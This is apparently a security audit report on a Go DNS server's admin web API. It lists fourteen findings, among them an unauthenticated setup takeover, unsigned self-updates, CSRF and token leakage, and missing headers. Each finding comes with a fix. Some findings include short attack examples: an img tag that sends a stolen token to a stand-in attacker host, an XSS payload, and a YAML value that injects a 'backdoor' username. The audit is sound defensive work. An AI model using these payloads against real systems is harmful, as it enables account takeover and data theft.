# Hunt: Web Auth & API

## Summary
14 findings: 2 critical 4 high 4 med 3 low 1 info

## Findings

### [CRITICAL] Unauthenticated setup endpoint reachable in production — full takeover  (CWE-862)
**File**: web/api_setup.go:39-98 ; web/server.go:50,90-106 ; web/api_setup.go:94
**Skill**: sc-authz, sc-business-logic, sc-privilege-escalation
**Description**: `setupDone` is a plain `bool` on `AdminServer` that is never initialized to `true` based on existing config — it is only flipped to `true` inside `handleSetupComplete` itself (`s.setupDone = true`) for the lifetime of that single process after a wizard run. `NewAdminServer` (server.go:90) constructs the struct without setting it, and no caller (`main_runtime_helpers.go:46`) ever sets it. Therefore on every restart of an already-configured server, `POST /api/setup/complete` is reachable unauthenticated and `if s.setupDone { ... }` (api_setup.go:45) does NOT block it. The handler then unconditionally calls `writeConfigYAML("labyrinth.yaml", ...)` (api_setup.go:88-92) which `os.Create`s and overwrites the config in CWD — letting an unauthenticated network attacker rewrite admin credentials, listen addresses, ACL, blocklist, and TLS settings.
**Reachability**: Any unauthenticated client that can reach the management port: `POST /api/setup/complete` with arbitrary `username`/`password`. After the call the in-memory config is *not* swapped, so login still uses old creds until restart — but the persisted YAML is the attacker's, so on the next restart the attacker owns the admin account; combined with `/api/system/update/apply` (post-login) this gives RCE.
**Recommendation**: Initialise `setupDone` from config state in `NewAdminServer` (e.g. `setupDone: cfg.Web.Auth.Username != "" && cfg.Web.Auth.PasswordHash != ""`). Additionally bind `/api/setup/*` to loopback only when setup is already done, or require an out-of-band setup token written to disk on first launch.

### [CRITICAL] Self-update endpoint downloads arbitrary GitHub asset over plain `http.Get` without signature/checksum verification  (CWE-494)
**File**: web/api_update.go:51,200-303,307-371
**Skill**: sc-api-security, sc-privilege-escalation
**Description**: `handleApplyUpdate` resolves an asset URL from `https://api.github.com/repos/labyrinthdns/labyrinth/releases/latest`, fetches it with the package-default `http.Get` (no pinned TLS, no checksum, no signature, no minisign/cosign), writes it over the running executable, and `syscall.Exec`s it (web/update_unix.go:14). There is no integrity check whatsoever; `compareSemver` does not constrain the source or asset name beyond `labyrinth-<os>-<arch>[.exe]` matched against whatever GitHub returns. An attacker who compromises the GitHub repo, the release process, or any TLS path that can serve a different release JSON to the resolver gains RCE on every Labyrinth instance that has self-update enabled.
**Reachability**: Authenticated admin (or pwned admin via the setup-wizard finding above) hits `POST /api/system/update/apply`. With `web.AutoUpdate` true the binary is also overwritten on a timer with the same trust model, but no auto-apply path exists in `StartUpdateChecker` — only the manual apply endpoint replaces the binary. Still, anyone with admin gets remote code execution by way of the official update channel.
**Recommendation**: Require a detached signature (cosign/minisign) over each release asset and verify it before `os.Rename` over the binary. At minimum, ship a SHA-256 manifest signed with a release key embedded in the binary, fetch+verify it, and refuse to apply if mismatched. Also pin `Accept` and `User-Agent` on the GitHub call and use a dedicated `*http.Client` with explicit TLS config rather than `http.Get`.

### [HIGH] No CSRF protection and no Origin/Referer check on state-changing POST/PUT/DELETE endpoints  (CWE-352)
**File**: web/middleware.go:19-55 ; web/auth.go:175-242
**Skill**: sc-csrf, sc-cors
**Description**: Auth is JWT-in-Authorization-header, which is normally CSRF-safe — *but* `requireAuth` (middleware.go:36-39) also accepts `?token=` query parameter for every protected route (not just WebSockets). Combined with the SPA storing the token in `localStorage` and there being no CSRF token, no Origin check, and no SameSite cookie shield, any page the operator visits that XHRs to `https://labyrinth.host/api/...?token=<leaked>` succeeds. Token leakage paths exist (Referer header on outbound nav from any page that includes the token in its URL — see SPA WS construction at `web/ui/src/api/client.ts:244,258`). No `Origin`/`Referer` validation in the JSON path either, so once any token is observed it can be replayed cross-origin.
**Reachability**: Attacker tricks admin into clicking a link that exfiltrates the token (e.g. via an `<img src="https://attacker/?t=...">` injected on any page that includes the token in the URL — like the WebSocket query string). The token can then be replayed against `/api/cache/flush`, `/api/blocklist/block`, `/api/config/raw`, `/api/system/update/apply`, etc.
**Recommendation**: Drop the `?token=` query-string fallback for HTTP routes (keep only Authorization header). For WebSocket upgrades, accept the token via Sec-WebSocket-Protocol subprotocol instead of the URL. Add Origin/Host equality check on every state-changing request.

### [HIGH] WebSocket upgrade accepts any Origin (`InsecureSkipVerify: true`)  (CWE-1385)
**File**: web/api_queries.go:43-55 ; web/timeseries_ws.go:121-129
**Skill**: sc-cors, sc-clickjacking, sc-csrf
**Description**: Both `/api/queries/stream` and `/api/stats/timeseries/ws` call `websocket.Accept(w, r, &websocket.AcceptOptions{InsecureSkipVerify: true})` which disables the library's same-origin check. Authentication relies on `?token=` in the URL (see `createQueryWebSocket` in `web/ui/src/api/client.ts:244-260`), so any malicious origin script that already obtained a token (from leaked URL/Referer, XSS, or token theft via the no-CSP HTML below) can establish a WS from any origin. There is no Origin allow-list and no CSWSH protection.
**Reachability**: Once an attacker page knows the token (see CSRF finding) it can `new WebSocket("wss://labyrinth/api/queries/stream?token=...")` from any origin and stream live DNS query telemetry — a meaningful confidentiality leak (every domain every client resolves).
**Recommendation**: Set `OriginPatterns` (nhooyr/websocket) to the configured admin host, or compare `r.Header.Get("Origin")` host-port to the request's `Host` header and reject mismatches. Move the token off the URL onto the `Sec-WebSocket-Protocol` subprotocol header.

### [HIGH] No security response headers (CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, HSTS)  (CWE-693, CWE-1021)
**File**: web/server.go:271-287 ; web/embed.go:15-51 ; web/middleware.go:57-62
**Skill**: sc-clickjacking, sc-header-injection, sc-api-security
**Description**: Neither `jsonResponse` (auth.go:57-62 jsonResponse equivalent in middleware.go) nor the SPA `http.FileServer` (embed.go:25,49) set any security header. The only header the codebase emits beyond `Content-Type` and `Cache-Control` (and `Alt-Svc` from `withQUICHeaders`) is the JSON content type. Result: the React admin UI can be framed (clickjacking against blocklist toggles, cache flush, password change), MIME-sniffed, and Referrer-leaks the URL (token-in-URL via WS) to any clicked link. No HSTS even when TLS is enabled.
**Reachability**: Any browser session against the admin UI: an attacker hosts `<iframe src="https://labyrinth.host/blocklist">` and tricks the admin into clicking transparent buttons.
**Recommendation**: Add a middleware that sets `Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; base-uri 'none'`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy: ...`, and `Strict-Transport-Security: max-age=31536000` when serving over TLS. Wrap `mux` in `server.go:156` with this middleware.

### [HIGH] JWT auth bypass when `web.auth.username == ""` (no auth configured) leaves all admin endpoints open  (CWE-306)
**File**: web/middleware.go:21-25 ; web/api_setup.go:88-156
**Skill**: sc-auth, sc-business-logic
**Description**: `requireAuth` short-circuits to `next(w, r)` when `s.config.Web.Auth.Username == ""`. Combined with the setup-wizard issue above, any installation that lands without a `web.auth.username` (e.g. a fresh `labyrinth.yaml` written by the setup wizard with `Username==""` — `writeConfigYAML` only emits the `auth:` block when `cfg.Username != ""`, api_setup.go:152-156) exposes every "protected" route — including `/api/auth/change-password`, `/api/config/raw` PUT, `/api/system/update/apply`, `/api/blocklist/*`, `/api/cache/flush` — without any credentials. Default `cfg.Web.Addr = "127.0.0.1:8080"` is not a security boundary once a reverse proxy is in front.
**Reachability**: Operator deploys without `web.auth` (or sends an empty username through the setup wizard). All endpoints are public.
**Recommendation**: Refuse to start the admin server when `web.Enabled && web.Auth.Username == ""` unless an explicit `web.auth.allow_anonymous: true` flag is set; log a startup error and exit. Alternatively, require auth and serve a one-time setup token to stdout when no creds are configured.

### [MEDIUM] Weak password policy: 8-character minimum, no complexity, length cap absent — bcrypt 72-byte truncation undisclosed  (CWE-521)
**File**: web/auth.go:146-167
**Skill**: sc-auth
**Description**: `MinPasswordLength = 8`, no upper bound, no class requirements, no breach-list check. bcrypt silently truncates passwords beyond 72 bytes, so a 200-char "secure" passphrase is reduced to its first 72 bytes without warning the user — a known footgun. The setup wizard (api_setup.go:60) hashes whatever the user provides without informing them.
**Reachability**: Operator picks `password` (8 chars) — accepted. Or pastes a long passphrase that is silently truncated.
**Recommendation**: Raise the floor to 12 chars; reject obviously-weak choices (zxcvbn or a top-N list); document and enforce a 72-byte ceiling, OR pre-hash with SHA-256 before bcrypt to neutralise the truncation.

### [MEDIUM] Token transmitted in URL query string for WebSocket and as fallback for HTTP — leaks via Referer, browser history, server logs  (CWE-598)
**File**: web/middleware.go:36-39 ; web/ui/src/api/client.ts:244,251-258
**Skill**: sc-jwt, sc-session
**Description**: `requireAuth` accepts `?token=<jwt>` for any route, and the SPA client `createQueryWebSocket` / `createTimeSeriesWebSocket` always passes the token in the URL. JWTs in URLs leak via `Referer` headers when the page (or any embedded asset) navigates to a third-party origin, end up in proxy/CDN/server access logs, and persist in browser history. The current Go server has no access log, but reverse proxies/load balancers in front of it will log the URL with the token.
**Reachability**: Any operator browser session: the token enters the URL bar for the WS handshake (browser history) and is sent in HTTP `Referer` whenever an external link is clicked while the WS URL is "current".
**Recommendation**: Move the token off the URL: pass it via `Sec-WebSocket-Protocol` (e.g. `Sec-WebSocket-Protocol: bearer.<jwt>`), and remove the `?token=` HTTP fallback in `requireAuth`.

### [MEDIUM] JWT secret rotated on every restart — no token revocation list, no `jti`, no per-user rotation on password change  (CWE-613)
**File**: web/server.go:75-79,99 ; web/auth.go:294-308
**Skill**: sc-jwt, sc-session
**Description**: `jwtSecret` is `crypto/rand` 32 bytes generated fresh in `NewAdminServer` and held only in process memory — that *does* invalidate all tokens on restart, but `handleChangePassword` (auth.go:294-308) does NOT rotate `s.jwtSecret`, so any token issued before the password change remains valid for its full 24-hour lifetime even though the password they were issued against has been replaced. There is also no `jti`/denylist, so a stolen token cannot be revoked except by restarting the process.
**Reachability**: Admin suspects credential compromise, changes the password — old session tokens still work for up to 24h.
**Recommendation**: Rotate `jwtSecret` (or bump a per-user `nbf`/`iat` floor) inside `handleChangePassword` after the YAML is persisted, and surface "log out other sessions" semantics. Optionally add a `jti` + small in-memory denylist to support explicit logout.

### [MEDIUM] `/api/system/update/check` and `/api/system/version` leak full version metadata that helps version-pinning attacks  (CWE-200)
**File**: web/api_system.go:31-45 ; web/server.go:393-394 ; web/api_update.go:77-118
**Skill**: sc-api-security
**Description**: `/api/system/version` is registered without `requireAuth` (server.go:394) and returns Go runtime version, build time, OS, arch, full Labyrinth version. `/api/setup/status` (server.go:389) likewise leaks the running version unauthenticated. Combined with the unauthenticated update-check path that can be reached if `/api/setup/complete` re-binds auth, this hands an attacker an exact CVE-targeting profile of the running binary.
**Reachability**: `curl http://host:8080/api/system/version` from the network.
**Recommendation**: Require auth on `/api/system/version` (or trim it to just a coarse string like "labyrinth"); for `/api/setup/status`, drop the `version` field — the SPA does not need it pre-login.

### [LOW] `writeConfigYAML` creates the config with default permissions; bcrypt hash is world-readable on first write  (CWE-732)
**File**: web/api_setup.go:101-159 ; web/auth.go:325-365
**Skill**: sc-api-security
**Description**: `writeConfigYAML` calls `os.Create(path)` (api_setup.go:102) which creates the file with mode `0666 & ~umask` (typically `0644`) — meaning the bcrypt hash is readable by every local user immediately after `POST /api/setup/complete`. `updatePasswordInConfigAtPath` (auth.go:363) properly chmod 0600s after a password change, but the initial setup-wizard write does not.
**Reachability**: Local user on a multi-tenant box reads `/etc/labyrinth/labyrinth.yaml` after first setup and feeds the bcrypt hash to a cracker.
**Recommendation**: After `f.Close()` in `writeConfigYAML`, call `os.Chmod(path, 0600)` (and ideally write to a temp file with `os.OpenFile(..., 0600)` then atomic rename, mirroring `writeFileAtomically`).

### [LOW] Cache-lookup and zabbix-key endpoints reflect attacker-controlled input verbatim into JSON/text without explicit charset hardening  (CWE-79, CWE-116)
**File**: web/api_cache.go:170-174,207-213 ; web/api_zabbix.go:50-69
**Skill**: sc-api-security, sc-header-injection
**Description**: `handleCacheLookup` echoes the raw `name` query param into the JSON `name` field (api_cache.go:171,209) and `handleZabbixItem` writes the requested key path back as part of the error message via `http.Error` with the default `text/plain; charset=utf-8` Content-Type (api_zabbix.go:64). With no `X-Content-Type-Options: nosniff` set globally, an old browser navigated to `/api/zabbix/item?key=<svg onload=alert(1)>` could MIME-sniff to HTML. The `application/json` path is currently safe, but defence-in-depth is missing.
**Reachability**: Authenticated admin only (these endpoints are auth-gated), so impact is small — but combined with the no-CSP finding it widens the attack surface for stored-XSS-via-blocklist-domain-name etc.
**Recommendation**: Add `X-Content-Type-Options: nosniff` globally (see security-headers finding). For `http.Error` callers in `api_zabbix.go` and `api_doh.go`, use a dedicated handler that does not echo user input back.

### [LOW] Setup-wizard YAML escaping is hand-rolled and incomplete — accepts characters that survive YAML quoting boundary differently  (CWE-91)
**File**: web/api_setup.go:109-114,120,151,154-155
**Skill**: sc-business-logic
**Description**: `escYAML` only triggers on a small set of meta-chars and falls back to `fmt.Sprintf("%q", s)` (Go-style double-quoted escape), which is *close to* YAML double-quoted scalar but not identical (e.g. Go escapes `\xNN` for high bytes; YAML would prefer `\uNNNN`). Inputs with control characters can produce a YAML file that parses into a different string than the one supplied by the admin. The `escYAML` heuristic also passes through anything not in its tiny list, so a value like `value\nweb:\n  auth:\n    username: backdoor` that does not contain any of `:#{}[]&*!|>'"%@`` would skip quoting and inject new YAML keys when it later reaches the Username field — but `Username` does contain the `:` token in many cases, so it would be quoted; still the fallback is fragile.
**Reachability**: Attacker who reaches `POST /api/setup/complete` (i.e. via the critical setup-bypass finding) supplies crafted whitespace/control-char-laden values that round-trip into unintended config (e.g. `listen_addr` containing a newline injecting an `acl:` block).
**Recommendation**: Use a proper YAML encoder (e.g. `gopkg.in/yaml.v3`) instead of hand-rolling field serialisation. The codebase already has a YAML parser; use a corresponding encoder.

### [INFO] `json.NewDecoder(r.Body).Decode(...)` everywhere — no `DisallowUnknownFields` and no body-size cap on management endpoints  (CWE-770)
**File**: web/auth.go:196,269 ; web/api_setup.go:51 ; web/api_config.go:294,338 ; web/api_blocklist.go:62,84 ; web/api_dashboard_layout.go:117
**Skill**: sc-api-security, sc-mass-assignment
**Description**: All JSON-decoding sites accept arbitrarily large request bodies (no `http.MaxBytesReader`) and silently ignore unknown fields. The structs are narrow (no embedded `*config.Config`), so classic mass-assignment is not directly exploitable on these endpoints — but `/api/config/raw` PUT accepts the full YAML as a JSON string with no size limit, allowing a memory-pressure DoS by sending a multi-GB body. The DoH POST path is correctly limited via `io.LimitReader(r.Body, 65536)` (api_doh.go:93), and `handleZabbixConn` reads at most 1024 bytes — but every JSON endpoint is unbounded.
**Reachability**: Authenticated admin (or unauthenticated for `/api/setup/complete`, `/api/auth/login`) sends a 10 GB body; server allocates and OOMs.
**Recommendation**: Wrap each handler with `r.Body = http.MaxBytesReader(w, r.Body, 1<<20)` (1 MiB; raise to 8 MiB only for `/api/config/raw`). Optionally `dec.DisallowUnknownFields()` on payloads where forward-compat is not needed.
